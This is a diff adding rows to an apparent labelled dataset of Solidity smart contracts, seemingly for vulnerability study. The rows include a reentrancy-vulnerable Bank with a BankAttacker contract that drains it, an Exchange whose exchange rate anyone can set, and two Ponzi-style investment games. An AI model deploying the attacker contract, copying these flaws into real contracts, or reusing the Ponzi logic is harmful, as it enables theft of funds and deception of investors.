+    // As the current block gets closer to `callerAllocationEndBlock`, the caller receives a larger precentage of the allocation
+    uint256 public callerAllocationStartBlock;
+    // From this block onwards, a third party caller (not the recipient) can generate and claim the recipient's full allocation
+    uint256 public callerAllocationEndBlock;
+    // Number of blocks in the caller allocation period as defined by `callerAllocationEndBlock` - `callerAllocationStartBlock`
+    uint256 public callerAllocationPeriod;
+
+    // Track if the generation process is started
+    bool public started;
+
+    // Track the already generated allocations for recipients
+    mapping (address => bool) public generated;
+
+    // Check that a recipient's allocation has not been generated
+    modifier notGenerated(address _recipient) {
+        require(!generated[_recipient]);
+        _;
+    }
+
+    // Check that the generation period is started
+    modifier isStarted() {
+        require(started);
+        _;
+    }
+
+    // Check that the generation period is not started
+    modifier isNotStarted() {
+        require(!started);
+        _;
+    }
+
+    event Generate(address indexed _recipient, address indexed _caller, uint256 _recipientTokenAmount, uint256 _callerTokenAmount, uint256 _block);
+
+    /**
+     * @dev MerkleMine constructor
+     * @param _token ERC20 token being distributed
+     * @param _genesisRoot Merkle root representing genesis state which encodes token recipients
+     * @param _totalGenesisTokens Total amount of tokens that can be generated
+     * @param _totalGenesisRecipients Total number of recipients included in genesis state
+     * @param _balanceThreshold Minimum ETH balance threshold for recipients included in genesis state
+     * @param _genesisBlock Block number of genesis - used to determine which ETH accounts are included in the genesis state
+     * @param _callerAllocationStartBlock Start block where a third party caller (not the recipient) can generate and split the allocation with the recipient
+     * @param _callerAllocationEndBlock From this block onwards, a third party caller (not the recipient) can generate and claim the recipient's full allocation
+     */
+    function MerkleMine(
+        address _token,
+        bytes32 _genesisRoot,
+        uint256 _totalGenesisTokens,
+        uint256 _totalGenesisRecipients,
+        uint256 _balanceThreshold,
+        uint256 _genesisBlock,
+        uint256 _callerAllocationStartBlock,
+        uint256 _callerAllocationEndBlock
+    )
+        public
+    {
+        // Address of token contract must not be null
+        require(_token != address(0));
+        // Number of recipients must be non-zero
+        require(_totalGenesisRecipients > 0);
+        // Genesis block must be at or before the current block
+        require(_genesisBlock <= block.number);
+        // Start block for caller allocation must be after current block
+        require(_callerAllocationStartBlock > block.number);
+        // End block for caller allocation must be after caller allocation start block
+        require(_callerAllocationEndBlock > _callerAllocationStartBlock);
+
+        token = ERC20(_token);
+        genesisRoot = _genesisRoot;
+        totalGenesisTokens = _totalGenesisTokens;
+        totalGenesisRecipients = _totalGenesisRecipients;
+        tokensPerAllocation = _totalGenesisTokens.div(_totalGenesisRecipients);
+        balanceThreshold = _balanceThreshold;
+        genesisBlock = _genesisBlock;
+        callerAllocationStartBlock = _callerAllocationStartBlock;
+        callerAllocationEndBlock = _callerAllocationEndBlock;
+        callerAllocationPeriod = _callerAllocationEndBlock.sub(_callerAllocationStartBlock);
+    }
+
+    /**
+     * @dev Start the generation period - first checks that this contract's balance is equal to `totalGenesisTokens`
+     * The generation period must not already be started
+     */
+    function start() external isNotStarted {
+        // Check that this contract has a sufficient balance for the generation period
+        require(token.balanceOf(this) >= totalGenesisTokens);
+
+        started = true;
+    }
+
+    /**
+     * @dev Generate a recipient's token allocation. Generation period must be started. Starting from `callerAllocationStartBlock`
+     * a third party caller (not the recipient) can invoke this function to generate the recipient's token
+     * allocation and claim a percentage of it. The percentage of the allocation claimed by the
+     * third party caller is determined by how many blocks have elapsed since `callerAllocationStartBlock`.
+     * After `callerAllocationEndBlock`, a third party caller can claim the full allocation
+     * @param _recipient Recipient of token allocation
+     * @param _merkleProof Proof of recipient's inclusion in genesis state Merkle root
+     */
+    function generate(address _recipient, bytes _merkleProof) external isStarted notGenerated(_recipient) {
+        // Check the Merkle proof
+        bytes32 leaf = keccak256(_recipient);
+        // _merkleProof must prove inclusion of _recipient in the genesis state root
+        require(MerkleProof.verifyProof(_merkleProof, genesisRoot, leaf));
+
+        generated[_recipient] = true;
+
+        address caller = msg.sender;
+
+        if (caller == _recipient) {
+            // If the caller is the recipient, transfer the full allocation to the caller/recipient
+            require(token.transfer(_recipient, tokensPerAllocation));
+
+            Generate(_recipient, _recipient, tokensPerAllocation, 0, block.number);
+        } else {
+            // If the caller is not the recipient, the token allocation generation
+            // can only take place if we are in the caller allocation period
+            require(block.number >= callerAllocationStartBlock);
+
+            uint256 callerTokenAmount = callerTokenAmountAtBlock(block.number);
+            uint256 recipientTokenAmount = tokensPerAllocation.sub(callerTokenAmount);
+
+            if (callerTokenAmount > 0) {
+                require(token.transfer(caller, callerTokenAmount));
+            }
+
+            if (recipientTokenAmount > 0) {
+                require(token.transfer(_recipient, recipientTokenAmount));
+            }
+
+            Generate(_recipient, caller, recipientTokenAmount, callerTokenAmount, block.number);
+        }
+    }
+
+    /**
+     * @dev Return the amount of tokens claimable by a third party caller when generating a recipient's token allocation at a given block
+     * @param _blockNumber Block at which to compute the amount of tokens claimable by a third party caller
+     */
+    function callerTokenAmountAtBlock(uint256 _blockNumber) public view returns (uint256) {
+        if (_blockNumber < callerAllocationStartBlock) {
+            // If the block is before the start of the caller allocation period, the third party caller can claim nothing
+            return 0;
+        } else if (_blockNumber >= callerAllocationEndBlock) {
+            // If the block is at or after the end block of the caller allocation period, the third party caller can claim everything
+            return tokensPerAllocation;
+        } else {
+            // During the caller allocation period, the third party caller can claim an increasing percentage
+            // of the recipient's allocation based on a linear curve - as more blocks pass in the caller allocation
+            // period, the amount claimable by the third party caller increases linearly
+            uint256 blocksSinceCallerAllocationStartBlock = _blockNumber.sub(callerAllocationStartBlock);
+            return tokensPerAllocation.mul(blocksSinceCallerAllocationStartBlock).div(callerAllocationPeriod);
+        }
+    }
+}
+
+/**
+ * @title BytesUtil
+ * @dev Utilities for extracting bytes from byte arrays
+ * Functions taken from:
+ * - https://github.com/ethereum/solidity-examples/blob/master/src/unsafe/Memory.sol
+ * - https://github.com/ethereum/solidity-examples/blob/master/src/bytes/Bytes.sol
+ */
+library BytesUtil{
+    uint256 internal constant BYTES_HEADER_SIZE = 32;
+    uint256 internal constant WORD_SIZE = 32;
+    
+    /**
+     * @dev Returns a memory pointer to the data portion of the provided bytes array.
+     * @param bts Memory byte array
+     */
+    function dataPtr(bytes memory bts) internal pure returns (uint256 addr) {
+        assembly {
+            addr := add(bts, /*BYTES_HEADER_SIZE*/ 32)
+        }
+    }
+    
+    /**
+     * @dev Copy 'len' bytes from memory address 'src', to address 'dest'.
+     * This function does not check the or destination, it only copies
+     * the bytes.
+     * @param src Memory address of source byte array
+     * @param dest Memory address of destination byte array
+     * @param len Number of bytes to copy from `src` to `dest`
+     */
+    function copy(uint256 src, uint256 dest, uint256 len) internal pure {
+        // Copy word-length chunks while possible
+        for (; len >= WORD_SIZE; len -= WORD_SIZE) {
+            assembly {
+                mstore(dest, mload(src))
+            }
+            dest += WORD_SIZE;
+            src += WORD_SIZE;
+        }
+
+        // Copy remaining bytes
+        uint256 mask = 256 ** (WORD_SIZE - len) - 1;
+        assembly {
+            let srcpart := and(mload(src), not(mask))
+            let destpart := and(mload(dest), mask)
+            mstore(dest, or(destpart, srcpart))
+        }
+    }
+
+    /**
+     * @dev Creates a 'bytes memory' variable from the memory address 'addr', with the
+     * length 'len'. The function will allocate new memory for the bytes array, and
+     * the 'len bytes starting at 'addr' will be copied into that new memory.
+     * @param addr Memory address of input byte array
+     * @param len Number of bytes to copy from input byte array
+     */
+    function toBytes(uint256 addr, uint256 len) internal pure returns (bytes memory bts) {
+        bts = new bytes(len);
+        uint256 btsptr = dataPtr(bts);
+        copy(addr, btsptr, len);
+    }
+    
+    /**
+     * @dev Copies 'len' bytes from 'bts' into a new array, starting at the provided 'startIndex'.
+     * Returns the new copy.
+     * Requires that:
+     *  - 'startIndex + len <= self.length'
+     * The length of the substring is: 'len'
+     * @param bts Memory byte array to copy from
+     * @param startIndex Index of `bts` to start copying bytes from
+     * @param len Number of bytes to copy from `bts`
+     */
+    function substr(bytes memory bts, uint256 startIndex, uint256 len) internal pure returns (bytes memory) {
+        require(startIndex + len <= bts.length);
+        if (len == 0) {
+            return;
+        }
+        uint256 addr = dataPtr(bts);
+        return toBytes(addr + startIndex, len);
+    }
+
+    /**
+     * @dev Reads a bytes32 value from a byte array by copying 32 bytes from `bts` starting at the provided `startIndex`.
+     * @param bts Memory byte array to copy from
+     * @param startIndex Index of `bts` to start copying bytes from
+     */
+    function readBytes32(bytes memory bts, uint256 startIndex) internal pure returns (bytes32 result) {
+        require(startIndex + 32 <= bts.length);
+
+        uint256 addr = dataPtr(bts);
+
+        assembly {
+            result := mload(add(addr, startIndex))
+        }
+
+        return result;
+    }
+}
+
+/**
+ * @title MultiMerkleMine
+ * @dev The MultiMerkleMine contract is purely a convenience wrapper around an existing MerkleMine contract deployed on the blockchain.
+ */
+contract MultiMerkleMine {
+	using SafeMath for uint256;
+
+	/**
+     * @dev Generates token allocations for multiple recipients. Generation period must be started.
+     * @param _merkleMineContract Address of the deployed MerkleMine contract
+     * @param _recipients Array of recipients
+     * @param _merkleProofs Proofs for respective recipients constructed in the format: 
+     *       [proof_1_size, proof_1, proof_2_size, proof_2, ... , proof_n_size, proof_n]
+     */
+	function multiGenerate(address _merkleMineContract, address[] _recipients, bytes _merkleProofs) public {
+		MerkleMine mine = MerkleMine(_merkleMineContract);
+		ERC20 token = ERC20(mine.token());
+
+		require(
+			block.number >= mine.callerAllocationStartBlock(),
+			""caller allocation period has not started""
+		);
+		
+		uint256 initialBalance = token.balanceOf(this);
+		bytes[] memory proofs = new bytes[](_recipients.length);
+
+		// Counter to keep track of position in `_merkleProofs` byte array
+		uint256 i = 0;
+		// Counter to keep track of index of each extracted Merkle proof
+		uint256 j = 0;
+
+		// Extract proofs
+		while(i < _merkleProofs.length){
+			uint256 proofSize = uint256(BytesUtil.readBytes32(_merkleProofs, i));
+
+			require(
+				proofSize % 32 == 0,
+				""proof size must be a multiple of 32""
+			);
+
+			proofs[j] = BytesUtil.substr(_merkleProofs, i + 32, proofSize);
+
+			i = i + 32 + proofSize;
+			j++;
+		}
+
+		require(
+			_recipients.length == j,
+			""number of recipients != number of proofs""
+		);
+
+		for (uint256 k = 0; k < _recipients.length; k++) {
+			// If recipient's token allocation has not been generated, generate the token allocation
+			// Else, continue to the next recipient
+			if (!mine.generated(_recipients[k])) {
+				mine.generate(_recipients[k], proofs[k]);
+			}
+		}
+
+		uint256 newBalanceSinceAllocation = token.balanceOf(this);
+		uint256 callerTokensGenerated = newBalanceSinceAllocation.sub(initialBalance);
+
+		// Transfer caller's portion of tokens generated by this function call 
+		if (callerTokensGenerated > 0) {
+			require(token.transfer(msg.sender, callerTokensGenerated));
+		}
+	}
+}
+",DISASSEMBLED
+3,"// Created using Token Wizard https://github.com/poanetwork/token-wizard by POA Network 
+/**
+ * This smart contract code is Copyright 2017 TokenMarket Ltd. For more information see https://tokenmarket.net
+ *
+ * Licensed under the Apache License, version 2.0: https://github.com/TokenMarketNet/ico/blob/master/LICENSE.txt
+ */
+
+pragma solidity ^0.4.6;
+
+/**
+ * Safe unsigned safe math.
+ *
+ * https://blog.aragon.one/library-driven-development-in-solidity-2bebcaf88736#.750gwtwli
+ *
+ * Originally from https://raw.githubusercontent.com/AragonOne/zeppelin-solidity/master/contracts/SafeMathLib.sol
+ *
+ * Maintained here until merged to mainline zeppelin-solidity.
+ *
+ */
+library SafeMathLibExt {
+
+  function times(uint a, uint b) returns (uint) {
+    uint c = a * b;
+    assert(a == 0 || c / a == b);
+    return c;
+  }
+
+  function divides(uint a, uint b) returns (uint) {
+    assert(b > 0);
+    uint c = a / b;
+    assert(a == b * c + a % b);
+    return c;
+  }
+
+  function minus(uint a, uint b) returns (uint) {
+    assert(b <= a);
+    return a - b;
+  }
+
+  function plus(uint a, uint b) returns (uint) {
+    uint c = a + b;
+    assert(c>=a);
+    return c;
+  }
+
+}",DISASSEMBLED
+17,"pragma solidity ^0.4.23;
+
+contract Exchange {
+    mapping (address => mapping (address => uint256)) public exchangeRate;
+
+    function setExchangeRate(address _partnerA, address _partnerB, uint256 _rate) public returns (bool){
+        exchangeRate[_partnerA][_partnerB] = _rate;
+    }
+
+    function exchange(address _partnerAddrB, uint256 _amount, address _userAddr) public{
+        uint256 tokenAmount = _amount * exchangeRate[msg.sender][_partnerAddrB];
+        require(_partnerAddrB.call(bytes4(sha3(""transfer(address,uint256)"")), _userAddr, tokenAmount));
+    }
+}",DISASSEMBLED
+6,"pragma solidity ^0.4.4;
+
+// kovan:   0x722475921ebc15078d4d6c93b4cff43eadf099c2
+// mainnet: 0x942ffef843d37805c59f30fabb99b46aad135288
+
+contract PreTgeExperty {
+
+  // TGE
+  struct Contributor {
+    address addr;
+    uint256 amount;
+    uint256 timestamp;
+    bool rejected;
+  }
+  Contributor[] public contributors;
+  mapping(address => bool) public isWhitelisted;
+  address public managerAddr;
+  address public whitelistManagerAddr;
+
+  // wallet
+  struct Tx {
+    address founder;
+    address destAddr;
+    uint256 amount;
+    bool active;
+  }
+  mapping (address => bool) public founders;
+  Tx[] public txs;
+
+  // preTGE constructor
+  function PreTgeExperty() public {
+    whitelistManagerAddr = 0x8179C4797948cb4922bd775D3BcE90bEFf652b23;
+    managerAddr = 0x9B7A647b3e20d0c8702bAF6c0F79beb8E9B58b25;
+    founders[0xCE05A8Aa56E1054FAFC214788246707F5258c0Ae] = true;
+    founders[0xBb62A710BDbEAF1d3AD417A222d1ab6eD08C37f5] = true;
+    founders[0x009A55A3c16953A359484afD299ebdC444200EdB] = true;
+  }
+
+  // whitelist address
+  function whitelist(address addr) public isWhitelistManager {
+    isWhitelisted[addr] = true;
+  }
+
+  function reject(uint256 idx) public isManager {
+    // contributor must exist
+    assert(contributors[idx].addr != 0);
+    // contribution cant be rejected
+    assert(!contributors[idx].rejected);
+
+    // de-whitelist address
+    isWhitelisted[contributors[idx].addr] = false;
+
+    // reject contribution
+    contributors[idx].rejected = true;
+
+    // return ETH to contributor
+    contributors[idx].addr.transfer(contributors[idx].amount);
+  }
+
+  // contribute function
+  function() public payable {
+    // allow to contribute only whitelisted KYC addresses
+    assert(isWhitelisted[msg.sender]);
+
+    // save contributor for further use
+    contributors.push(Contributor({
+      addr: msg.sender,
+      amount: msg.value,
+      timestamp: block.timestamp,
+      rejected: false
+    }));
+  }
+
+  // one of founders can propose destination address for ethers
+  function proposeTx(address destAddr, uint256 amount) public isFounder {
+    txs.push(Tx({
+      founder: msg.sender,
+      destAddr: destAddr,
+      amount: amount,
+      active: true
+    }));
+  }
+
+  // another founder can approve specified tx and send it to destAddr
+  function approveTx(uint8 txIdx) public isFounder {
+    assert(txs[txIdx].founder != msg.sender);
+    assert(txs[txIdx].active);
+
+    txs[txIdx].active = false;
+    txs[txIdx].destAddr.transfer(txs[txIdx].amount);
+  }
+
+  // founder who created tx can cancel it
+  function cancelTx(uint8 txIdx) {
+    assert(txs[txIdx].founder == msg.sender);
+    assert(txs[txIdx].active);
+
+    txs[txIdx].active = false;
+  }
+
+  // isManager modifier
+  modifier isManager() {
+    assert(msg.sender == managerAddr);
+    _;
+  }
+
+  // isWhitelistManager modifier
+  modifier isWhitelistManager() {
+    assert(msg.sender == whitelistManagerAddr);
+    _;
+  }
+
+  // check if msg.sender is founder
+  modifier isFounder() {
+    assert(founders[msg.sender]);
+    _;
+  }
+
+  // view functions
+  function getContributionsCount(address addr) view returns (uint count) {
+    count = 0;
+    for (uint i = 0; i < contributors.length; ++i) {
+      if (contributors[i].addr == addr) {
+        ++count;
+      }
+    }
+    return count;
+  }
+
+  function getContribution(address addr, uint idx) view returns (uint amount, uint timestamp, bool rejected) {
+    uint count = 0;
+    for (uint i = 0; i < contributors.length; ++i) {
+      if (contributors[i].addr == addr) {
+        if (count == idx) {
+          return (contributors[i].amount, contributors[i].timestamp, contributors[i].rejected);
+        }
+        ++count;
+      }
+    }
+    return (0, 0, false);
+  }
+}",DISASSEMBLED
+7,"pragma solidity ^0.4.9;
+
+/*
+Protect The Castle !
+
+The castle is under attack and needs the help of its citizens to support the cost of war.
+
+If you are a loyal citizen and help to finance the defense of the castle, the King will pay you back 2 times what you invested when its fund will allow him to.
+
+If no one contributes to the reparation for 6 hours, the castle will fall under the attack and the last 3 citizens who financed the defense will get the King’s Piggy bank (respectively 55%, 30% and 15%).
+
+If you are the first one to invest after the castle has fallen, you will be the new King's Jester and take 3% of all the transactions until the castle falls again.
+
+There are always some people to bribe, so a small fee of 3% is taken to ensure the system keeps working.
+
+NO SURRENDER EDITION - no self-destruct - this game will run forever!
+*/
+
+contract ProtectTheCastle {
+    // King's Jester
+    address public jester;
+    // Record the last Reparation time
+    uint public lastReparation;
+    // Piggy Bank Amount
+    uint public piggyBank;
+
+    // Collected Fee Amount
+    uint public collectedFee;
+
+    // Track the citizens who helped to repair the castle
+    address[] public citizensAddresses;
+    uint[] public citizensAmounts;
+    uint32 public totalCitizens;
+    uint32 public lastCitizenPaid;
+    // Bribed Citizen who made the system works
+    address public bribedCitizen;
+    // Record how many times the castle has fallen
+    uint32 public round;
+    // Amount already paid back in this round
+    uint public amountAlreadyPaidBack;
+    // Amount invested in this round
+    uint public amountInvested;
+
+    uint constant SIX_HOURS = 60 * 60 * 6;
+
+    function ProtectTheCastle() {
+        // Define the first castle
+        bribedCitizen = msg.sender;
+        jester = msg.sender;
+        lastReparation = block.timestamp;
+        amountAlreadyPaidBack = 0;
+        amountInvested = 0;
+        totalCitizens = 0;
+    }
+
+    function repairTheCastle() payable returns(bool) {
+        uint amount = msg.value;
+        // Check if the minimum amount if reached
+        if (amount < 10 finney) {
+            msg.sender.send(msg.value);
+            return false;
+        }
+        // If the amount received is more than 100 ETH return the difference
+        if (amount > 100 ether) {
+            msg.sender.send(msg.value - 100 ether);
+            amount = 100 ether;
+        }
+
+        // Check if the Castle has fell
+        if (lastReparation + SIX_HOURS < block.timestamp) {
+            // Send the Piggy Bank to the last 3 citizens
+            // If there is no one who contributed this last 6 hours, no action needed
+            if (totalCitizens == 1) {
+                // If there is only one Citizen who contributed, he gets the full Pigg Bank
+                citizensAddresses[citizensAddresses.length - 1].send(piggyBank);
+            } else if (totalCitizens == 2) {
+                // If only 2 citizens contributed
+                citizensAddresses[citizensAddresses.length - 1].send(piggyBank * 65 / 100);
+                citizensAddresses[citizensAddresses.length - 2].send(piggyBank * 35 / 100);
+            } else if (totalCitizens >= 3) {
+                // If there are 3 or more citizens who contributed
+                citizensAddresses[citizensAddresses.length - 1].send(piggyBank * 55 / 100);
+                citizensAddresses[citizensAddresses.length - 2].send(piggyBank * 30 / 100);
+                citizensAddresses[citizensAddresses.length - 3].send(piggyBank * 15 / 100);
+            }
+
+            // Define the new Piggy Bank
+            piggyBank = 0;
+
+            // Define the new Castle
+            jester = msg.sender;
+            lastReparation = block.timestamp;
+            citizensAddresses.push(msg.sender);
+            citizensAmounts.push(amount * 2);
+            totalCitizens += 1;
+            amountInvested += amount;
+
+            // All goes to the Piggy Bank
+            piggyBank += amount;
+
+            // The Jester take 3%
+            jester.send(amount * 3 / 100);
+
+            // The bribed Citizen takes 3%
+            collectedFee += amount * 3 / 100;
+
+            round += 1;
+        } else {
+            // The Castle is still up
+            lastReparation = block.timestamp;
+            citizensAddresses.push(msg.sender);
+            citizensAmounts.push(amount * 2);
+            totalCitizens += 1;
+            amountInvested += amount;
+
+            // 5% goes to the Piggy Bank
+            piggyBank += (amount * 5 / 100);
+
+            // The Jester takes 3%
+            jester.send(amount * 3 / 100);
+
+            // The bribed Citizen takes 3%
+            collectedFee += amount * 3 / 100;
+
+            while (citizensAmounts[lastCitizenPaid] < (address(this).balance - piggyBank - collectedFee) && lastCitizenPaid <= totalCitizens) {
+                citizensAddresses[lastCitizenPaid].send(citizensAmounts[lastCitizenPaid]);
+                amountAlreadyPaidBack += citizensAmounts[lastCitizenPaid];
+                lastCitizenPaid += 1;
+            }
+        }
+    }
+
+    // fallback function
+    function() payable {
+        repairTheCastle();
+    }
+
+    // When the bribed Citizen decides to give his seat to someone else
+    function newBribedCitizen(address newBribedCitizen) {
+        if (msg.sender == bribedCitizen) {
+            bribedCitizen = newBribedCitizen;
+        }
+    }
+
+    // When the bribed Citizen decides to collect his fees
+    function collectFee() payable {
+        if (msg.sender == bribedCitizen) {
+            bribedCitizen.send(collectedFee);
+        }
+    }
+
+    // When the jester can't handle it anymore, he can give his position to someone else
+    function newJester(address newJester) {
+        if (msg.sender == jester) {
+            jester = newJester;
+        }
+    }       
+}",DISASSEMBLED
+10,"pragma solidity ^0.4.0;
+
+/// @title PonzICO
+/// @author acityinohio
+contract PonzICO {
+    address public owner;
+    uint public total;
+    mapping (address => uint) public invested;
+    mapping (address => uint) public balances;
+    address[] investors;
+
+    //log event of successful investment/withdraw and address
+    event LogInvestment(address investor, uint amount);
+    event LogWithdrawal(address investor, uint amount);
+
+    //modifiers for various things
+    modifier checkZeroBalance() { if (balances[msg.sender] == 0) { throw; } _;}
+    modifier accreditedInvestor() { if (msg.value < 100 finney) { throw; } _;}
+
+	//constructor for initializing PonzICO.
+    //the owner is the genius who made this revolutionary smart contract
+	function PonzICO() {
+		owner = msg.sender;
+	}
+
+    //the logic for a small fee for the creator of this contract
+    //miniscule in the grand scheme of things
+    function ownerFee(uint amount) private returns (uint fee) {
+        if (total < 200000 ether) {
+            fee = amount/2;
+            balances[owner] += fee;
+        }
+        return;
+    }
+
+    //This is where the magic is withdrawn.
+    //For users with balances. Can only be used to withdraw full balance.
+    function withdraw()
+    checkZeroBalance()
+    {
+        uint amount = balances[msg.sender];
+        balances[msg.sender] = 0;
+        if (!msg.sender.send(amount)) {
+            balances[msg.sender] = amount;
+        } else {
+            LogWithdrawal(msg.sender, amount);
+        }
+    }
+
+    //What's better than withdrawing? Re-investing profits!
+    function reinvest()
+    checkZeroBalance()
+    {
+        uint dividend = balances[msg.sender];
+        balances[msg.sender] = 0;
+        uint fee = ownerFee(dividend);
+        dividend -= fee;
+        for (uint i = 0; i < investors.length; i++) {
+            balances[investors[i]] += dividend * invested[investors[i]] / total;
+        }
+        invested[msg.sender] += (dividend + fee);
+        total += (dividend + fee);
+        LogInvestment(msg.sender, dividend+fee);
+    }
+
+	//This is the where the magic is invested.
+    //Note the accreditedInvestor() modifier, to ensure only sophisticated
+    //investors with 0.1 ETH or more can invest. #SelfRegulation
+	function invest() payable
+    accreditedInvestor()
+    {
+        //first send the owner's modest 50% fee but only if the total invested is less than 200000 ETH
+        uint dividend = msg.value;
+        uint fee = ownerFee(dividend);
+        dividend -= fee;
+        //then accrue balances from the generous remainder to everyone else previously invested
+        for (uint i = 0; i < investors.length; i++) {
+            balances[investors[i]] += dividend * invested[investors[i]] / total;
+        }
+
+        //finally, add this enterprising new investor to the public balances
+        if (invested[msg.sender] == 0) {
+            investors.push(msg.sender);
+            invested[msg.sender] = msg.value;
+        } else {
+            invested[msg.sender] += msg.value;
+        }
+        total += msg.value;
+        LogInvestment(msg.sender, msg.value);
+	}
+
+    //finally, fallback function. no one should send money to this contract
+    //without first being added as an investment.
+    function () { throw; }
+}",DISASSEMBLED
+14,"pragma solidity 0.4.23;
+
+ contract Bank{
+
+     mapping(address=>uint) userBalances;
+
+     event Name(address send);
+
+     function getUserBalance(address user) public view returns(uint) {
+         return userBalances[user];
+     }
+
+     function addToBalance() public payable{
+         userBalances[msg.sender] = userBalances[msg.sender] + msg.value;
+     }
+
+     function withdrawBalance() public {
+         uint amountToWithdraw = userBalances[msg.sender];
+         emit Name(msg.sender);
+         if (msg.sender.call.value(amountToWithdraw)() == false) {
+             revert();
+         }
+         userBalances[msg.sender] = 0;
+     }
+
+     function contractHoldEth() public view returns (uint256){
+         return address(this).balance;
+     }
+ }
+
+ contract BankAttacker{
+
+     bool public is_attack;
+     address public bankAddress;
+
+     constructor(address _bankAddress, bool _is_attack) public {
+         bankAddress = _bankAddress;
+         is_attack = _is_attack;
+     }
+
+     function() public payable{
+         if(is_attack==true)
+         {
+             is_attack=false;
+             if(bankAddress.call(bytes4(keccak256(""withdrawBalance()""))) == false) {
+                 revert();
+             }
+        }
+     }
+
+     function  deposit() public payable{
+         if(bankAddress.call.value(msg.value).gas(20764)(bytes4(keccak256(""addToBalance()""))) == false) {
+             revert();
+         }
+     }
+
+     function  withdraw() public {
+         if(bankAddress.call.gas(200000)(bytes4(keccak256(""withdrawBalance()""))) == false) {
+             revert();
+         }
+     }
+
+     function contractHoldEth() public view returns (uint256){
+         return address(this).balance;
+     }
+
+     function withdrawBalance() public {
+         require(msg.sender.send(address(this).balance));
+     }
+ }",DISASSEMBLED
+16,"pragma solidity ^0.4.23;
+
+
+contract Owned {
+    address public owner;
+    address public newOwner;
+
+    event OwnershipTransferred(address indexed _from, address indexed _to);
+
+    function Owned() public {
+        owner = msg.sender;
+    }
+
+    modifier onlyOwner {
+        require(msg.sender == owner);
+        _;
+    }
+
+    function transferOwnership(address _newOwner) public onlyOwner {
+        newOwner = _newOwner;
+    }
+
+    function acceptOwnership() public {
+        require(msg.sender == newOwner);
+        emit OwnershipTransferred(owner, newOwner);
+        owner = newOwner;
+        newOwner = address(0);
+    }
+}
+
+
+contract PointEX is Owned {
+    mapping(address => bool) private distributor;
+
+    modifier onlyDistributor {
+        require(distributor[msg.sender] == true);
+        _;
+    }
+
+    event GetTransactionData(string _fromCompany, string _fromID, uint256 _fromAmounts, string _toCompany, string _toID, uint256 _toAmounts, address indexed _recorder);
+
+    function PointEX() public {
+        distributor[owner] = true;
+    }
+
+    function transfer(string _fromCompany, string _fromID, uint256 _fromAmounts, string _toCompany, string _toID, uint256 _toAmounts) public onlyDistributor returns (bool) {
+        emit GetTransactionData(_fromCompany, _fromID, _fromAmounts, _toCompany, _toID, _toAmounts, msg.sender);
+        
+        return true;
+    }
+
+    function setDistributor(address _dis, bool _status) public onlyOwner returns (bool) {
+        require(_dis != address(0));
+
+        distributor[_dis] = _status;
+
+        return true;
+    }
+}",DISASSEMBLED
